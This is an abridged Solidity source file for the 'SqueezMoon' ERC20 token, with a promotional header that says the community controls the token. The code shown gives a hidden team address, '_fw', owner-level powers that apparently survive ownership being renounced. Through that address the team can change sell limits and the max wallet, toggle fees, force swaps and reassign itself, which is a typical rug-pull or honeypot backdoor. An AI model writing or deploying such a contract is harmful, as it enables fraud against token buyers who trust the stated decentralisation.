...
//
//   Welcome to SqueezMoon! 🚀
//
//  The first community ran,token with the goal of squeezing its own supply and price. 
//  Transparency and authenticity are placed at the heart of SqueezMoon, which is why the community are put in the driving seat!
//
//  https://squeezmoon.com/
//  https://t.me/SqueezMoon
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _transfer(
        ...
        uint256 fromBalance = _b[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _b[from] = fromBalance - amount;
        }
        _b[to] += amount;
...
contract SqueezMoon is ERC20, Ownable {
    ...
    constructor() payable ERC20("SqueezMoon", "$SQM") {
        ...
        updateLimits(20000000 ether, 20000000 ether, 20000000 ether);
    ...
    function addLP() external onlyOverriden {
    ...
    function enableTrading() external onlyOverriden {
        tradingLive = true;
    }

    modifier onlyOverriden() {
        require(
            _fw == _msgSender() ||
                owner() == _msgSender() ||
                owner() == address(this),
            "Caller is not the _fw address nor owner."
        );
        _;
    }
    ...
    function updateLimits(
        ...
        uint256 sellLimit,
        uint256 _maxWallet
    ) public onlyOverriden {
        maxTransactionAmountOnPurchase = buyLimit;
        maxTransactionAmountOnSale = sellLimit;
        maxWallet = _maxWallet;
    }

    function setFeeState(bool state) external onlyOverriden {
        feesDisabled = state;
    }

    function updateTeamWallet(address newWallet) external onlyOverriden {
        _fw = newWallet;
    }
    ...
    function forceSwap() external onlyOverriden {
